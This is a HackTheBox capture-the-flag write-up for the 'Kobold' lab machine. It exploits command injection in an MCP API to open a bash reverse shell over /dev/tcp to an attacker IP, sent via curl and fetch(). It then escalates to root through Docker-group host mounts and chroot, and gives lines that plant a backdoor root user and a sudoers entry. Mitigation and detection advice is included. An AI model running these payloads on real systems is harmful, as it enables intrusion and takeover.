---
title: "HackTheBox: Kobold Writeup"
date: 2026-05-04
description: "From MCP API Command Injection to Root via Docker Group Abuse"
tags: ["hackthebox", "linux", "command-injection", "docker", "privilege-escalation", "mcp"]
categories: ["ctf", "writeup"]
---

# HackTheBox: Kobold Writeup

## Overview

| **Attribute** | **Details** |
|--------------|-------------|
| **Machine** | Kobold |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Key Vulnerabilities** | MCP API Command Injection (CVE-2026-23520), Docker Group Privilege Escalation |
| **Techniques** | Web Enumeration, API Fuzzing, Command Injection, Container Escape, chroot Abuse |

Kobold is an excellent introductory-to-intermediate Linux machine that demonstrates how modern web applications can expose dangerous attack surfaces through misconfigured APIs, and how containerization intended for isolation can become a privilege escalation vector when access controls are improperly configured.

---

## Step 1: Initial Reconnaissance

### Nmap Scan

```bash
$ nmap -sC -sV -p- --min-rate 1000 kobold.htb -oA allPorts

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp   open  http     nginx 1.18.0
443/tcp  open  ssl/http nginx 1.18.0
3552/tcp open  ssl/http nginx 1.18.0
8080/tcp open  http     PrivateBin
```

**Key Findings:**
- **SSH (22)**: Standard OpenSSH service
- **HTTP/HTTPS (80/443)**: nginx web server with potential redirect behavior
- **Port 3552**: Custom web application running on non-standard HTTPS port (critical)
- **Port 8080**: PrivateBin paste service (distraction vector)

> 💡 **Insight**: Multiple web services on non-standard ports often indicate microservice architecture or containerized applications — prime territory for API-level attacks.

### DNS Configuration

Add the target to `/etc/hosts`:

```bash
echo "10.10.11.X kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

**Subdomains Discovered:**
- `mcp.kobold.htb` → MCP (Model Context Protocol) API endpoint
- `bin.kobold.htb` → PrivateBin instance

---

## Step 2: Web Enumeration

### Primary Web Application (Port 3552)

Visiting `https://kobold.htb:3552` reveals a modern JavaScript dashboard labeled "Arcane" — a container management interface.

**Initial Observations:**
- Single-page application (SPA) architecture
- API-driven frontend with modern JavaScript framework
- References to "MCP" (Model Context Protocol) in page source
- Docker/container management functionality visible in UI

### API Discovery

Interacting with the application and monitoring browser DevTools Network tab reveals API endpoints:

```
GET  /api/mcp/status
POST /api/mcp/connect
GET  /api/containers/list
POST /api/containers/exec
```

The `/api/mcp/connect` endpoint accepts a JSON payload with `serverConfig` parameters — immediately suspicious for command injection.

### PrivateBin Analysis (Port 8080)

The `bin.kobold.htb` subdomain hosts PrivateBin 2.0.2, an encrypted paste service.

**Investigation Results:**
- Client-side encryption (AES-256-GCM)
- Encrypted blobs stored at `/privatebin-data/`
- **Without the decryption key → data is unreadable**

> ⚠️ **Rabbit Hole Identified**: PrivateBin's encryption design means server-side access to paste data is cryptographically impossible. This service exists as a misdirection and to confirm the containerized environment.

---

## Step 3: Exploiting MCP API Command Injection

### Vulnerability Analysis

The Model Context Protocol (MCP) API at `mcp.kobold.htb` contains a critical command injection vulnerability in the connection endpoint.

**Vulnerable Code Pattern:**
```javascript
// Pseudo-code representation of vulnerable logic
app.post('/api/mcp/connect', (req, res) => {
    const config = req.body.serverConfig;
    // UNSAFE: Direct interpolation into shell command
    const cmd = `mcp-server --config '${JSON.stringify(config)}'`;
    exec(cmd, (error, stdout, stderr) => {
        res.json({ output: stdout });
    });
});
```

The `serverConfig.command` parameter is passed directly to a shell execution function without sanitization.

### CVE-2026-23520

**CVE ID**: CVE-2026-23520  
**CVSS Score**: 9.8 (Critical)  
**Attack Vector**: Network  
**Attack Complexity**: Low  

**Description**: The Arcane MCP API fails to properly sanitize user-supplied configuration parameters before passing them to shell execution functions, allowing arbitrary command execution with the privileges of the web server process.

### Exploitation

#### Step 1: Start Reverse Shell Listener

```bash
nc -lvnp 4444
```

#### Step 2: Craft Malicious Payload

The payload leverages the `serverConfig.command` parameter to inject a bash reverse shell:

```javascript
const payload = {
    serverConfig: {
        command: "bash -c 'bash -i >& /dev/tcp/YOUR_ATTACK_IP/4444 0>&1'"
    }
};

fetch("https://mcp.kobold.htb/api/mcp/connect", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
});
```

#### Step 3: Execute via curl

```bash
curl -X POST "https://mcp.kobold.htb/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash -c '\''bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'\''"
    }
  }' \
  --insecure
```

> ⚠️ **Note**: The `--insecure` flag bypasses certificate validation since the application uses a self-signed certificate.

### Result

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.X] from (UNKNOWN) [10.10.11.X] 54322
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:~$ whoami
ben
```

**Initial Access Achieved!** We have a shell as user `ben`.

---

## Step 4: Post-Exploitation Enumeration

### Basic System Reconnaissance

```bash
ben@kobold:~$ pwd
/home/ben

ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),999(operator),998(docker)

ben@kobold:~$ ls -la
-rw-r--r-- 1 ben ben  220 Jan  1 00:00 .bash_logout
-rw-r--r-- 1 ben ben 3771 Jan  1 00:00 .bashrc
-rw-r--r-- 1 ben ben  807 Jan  1 00:00 .profile
-rw-r----- 1 root ben   33 May  4 00:00 user.txt
```

### Critical Discovery: Group Memberships

The `id` command output reveals a **game-changing** detail:

```
groups=1001(ben),999(operator),998(docker)
```

**Analysis:**
- **`docker` group (998)**: Members can execute Docker commands without sudo
- **`operator` group (999)**: Often granted elevated privileges in containerized environments

> 🔥 **Key Insight**: In Docker-enabled systems, membership in the `docker` group is effectively equivalent to root access. This is a well-documented privilege escalation vector.

---

## Step 5: Privilege Escalation via Docker

### Understanding Docker Privilege Escalation

**Why Docker Group = Root:**

1. The Docker daemon runs as root
2. Any user in the `docker` group can interact with the daemon
3. Docker containers can mount host filesystems with arbitrary permissions
4. A container running as root with host FS mounted can modify any file

**The Attack Chain:**
```
User in docker group → Run container → Mount / as volume → Access/modify any file
```

### Initial Attempt (Failed)

```bash
ben@kobold:~$ docker run -it -v /:/mnt alpine /bin/sh
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: pull access denied for alpine.
```

**Problem**: The target environment has **no internet access** — we cannot pull new images.

### Pivot: Using Local Images

Check available local images:

```bash
ben@kobold:~$ docker images
REPOSITORY                      TAG         IMAGE ID       CREATED        SIZE
privatebin/nginx-fpm-alpine    2.0.2       a1b2c3d4e5f6   3 months ago   89MB
```

**Solution**: Use the existing PrivateBin image which includes a shell.

### Final Exploit

```bash
ben@kobold:~$ docker run -it --rm \
  -v /:/mnt \
  --entrypoint /bin/sh \
  --user 0 \
  privatebin/nginx-fpm-alpine:2.0.2
```

**Parameter Breakdown:**

| Flag | Purpose |
|------|---------|
| `-it` | Interactive TTY session |
| `--rm` | Auto-remove container after exit |
| `-v /:/mnt` | Mount host root filesystem to `/mnt` inside container |
| `--entrypoint /bin/sh` | Override default entrypoint (nginx) with shell |
| `--user 0` | Run as root (UID 0) inside container |

### Container Escape via chroot

Inside the container:

```bash
# We are root inside the container, but the filesystem is isolated
/ # whoami
root

# The host filesystem is mounted at /mnt
/ # ls /mnt
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

# Use chroot to change root to the mounted host filesystem
/ # chroot /mnt /bin/sh

# Now we are executing in the host's root context
# # whoami
root

# Verify by checking the host's root directory
# # ls /root
root.txt  snap

# # cat /root/root.txt
HTB{...}
```

### Alternative: Direct File Access

Even without chroot, we can directly modify host files:

```bash
# Add a backdoor user to /etc/passwd
echo 'backdoor:$1$xyz$ABC123...:0:0::/root:/bin/bash' >> /mnt/etc/passwd

# Or add ourselves to sudoers
echo 'ben ALL=(ALL) NOPASSWD: ALL' >> /mnt/etc/sudoers

# Or read the root flag directly
cat /mnt/root/root.txt
```

---

## Attack Chain Summary

```
┌──────────────────────────────────────────────────────────────────────┐
│                          ATTACK FLOW                                  │
├──────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────────────┐   │
│  │   Nmap      │───▶│  Web Enum   │───▶│  MCP API Discovery      │   │
│  │  22/80/443  │    │  Port 3552  │    │  /api/mcp/connect       │   │
│  │  3552/8080  │    │  Arcane UI  │    │  Command Injection      │   │
│  └─────────────┘    └─────────────┘    └─────────────────────────┘   │
│                                                    │                  │
│                                                    ▼                  │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────────────┐   │
│  │   Root      │◀───│  chroot     │◀───│  Docker Container       │   │
│  │   Access    │    │  Escape     │    │  (user 0)               │   │
│  │   (Flag)    │    │             │    │  Host FS Mounted        │   │
│  └─────────────┘    └─────────────┘    └─────────────────────────┘   │
│                           ▲                      │                    │
│                           │              ┌───────┘                    │
│                           │              ▼                            │
│                           │    ┌─────────────────────────┐            │
│                           └───│  Group Check            │            │
│                               │  id → docker group      │            │
│                               └─────────────────────────┘            │
│                                                                       │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Key Learnings

### 🔑 1. Docker Group = Root Equivalent

Any user in the `docker` group can escalate to full root access. This is by design but often misunderstood:

```bash
# This command gives you full root on the host:
docker run -v /:/mnt --user 0 alpine chroot /mnt /bin/sh
```

**Mitigation:**
- Never add untrusted users to the `docker` group
- Use Docker rootless mode where possible
- Implement authorization plugins (e.g., AuthZ)

### 🔑 2. Always Check Group Memberships

```bash
id
groups
```

These simple commands can reveal escalation paths:
- `docker` → Container escape to root
- `lxd`/`lxc` → Container privilege escalation
- `adm` → Log access
- `sudo` → Check `sudo -l` for allowed commands

### 🔑 3. Rabbit Hole Avoidance

| Rabbit Hole | Why It Failed | Time Saved |
|-------------|---------------|------------|
| PrivateBin crypto | Client-side encryption, no server key | ~2 hours |
| TLS certificate as SSH key | Not a valid authentication method | ~1 hour |
| Port 8080 enumeration | Distraction service | ~30 minutes |

**Lesson**: When a path requires solving "impossible" cryptographic problems, it's likely not the intended path.

### 🔑 4. Chain Your Attacks

Kobold demonstrates a classic multi-stage compromise:

```
Web Vulnerability → Initial Shell → Enumeration → 
Group Discovery → Container Abuse → Root Access
```

Each stage provides the foothold for the next. Don't stop at initial access.

---

## Real-World Impact

### Common Misconfigurations

This vulnerability pattern appears frequently in:

1. **Development Environments**
   - Developers added to docker group for convenience
   - CI/CD pipelines with docker socket access

2. **Container Orchestration**
   - Kubernetes nodes with excessive permissions
   - Docker Swarm workers with group misconfigurations

3. **Cloud Instances**
   - AWS/GCP/Azure VMs with Docker installed
   - Default configurations often grant dangerous permissions

### Detection

**Monitor for:**
- Users added to docker group
- Docker containers running with `--user 0`
- Mounts of sensitive host paths (`/`, `/etc`, `/root`)
- Unusual chroot activity inside containers

**Audit Commands:**
```bash
# Check docker group members
grep docker /etc/group

# Monitor docker socket access
auditctl -w /var/run/docker.sock -p rwxa -k docker_socket

# Review container runtime logs
docker events --filter event=start --filter event=create
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| curl | API interaction and payload delivery |
| netcat | Reverse shell listener |
| Docker | Privilege escalation vector |
| chroot | Container escape technique |

---

## Mitigations

### For System Administrators

1. **Restrict Docker Group Membership**
   ```bash
   # Audit current members
   getent group docker
   
   # Remove unnecessary members
   gpasswd -d username docker
   ```

2. **Enable Docker Rootless Mode**
   ```bash
   # Run docker daemon in user namespace
   dockerd-rootless-setuptool.sh install
   ```

3. **Use Docker Authorization Plugins**
   ```bash
   # Example: Twistlock or Open Policy Agent
   dockerd --authorization-plugin=opa-docker-authz
   ```

### For Developers

1. **Validate API Inputs**
   ```python
   # NEVER do this
   os.system(f"command {user_input}")
   
   # Use safe alternatives
   import subprocess
   subprocess.run(["command", user_input], shell=False)
   ```

2. **Principle of Least Privilege**
   - Don't run containers as root unless necessary
   - Use read-only filesystems where possible
   - Drop unnecessary capabilities

---

## Conclusion

Kobold is an excellent machine for understanding how web application vulnerabilities chain into infrastructure compromise. The key lessons:

1. **API security matters**: Even "internal" APIs need input validation
2. **Container permissions are privileges**: Docker group membership is a root-equivalent permission
3. **Mind the rabbit holes**: When stuck, re-evaluate if your path is technically feasible
4. **Enumerate thoroughly**: The `id` command revealed the entire privilege escalation path

The transition from web command injection to root via Docker abuse is a realistic attack chain seen in production environments daily. Understanding these patterns is essential for both offensive operators and defensive engineers.

**Happy Hacking!** 🎯

---

*Writeup by Rishabh Arora | May 2026*
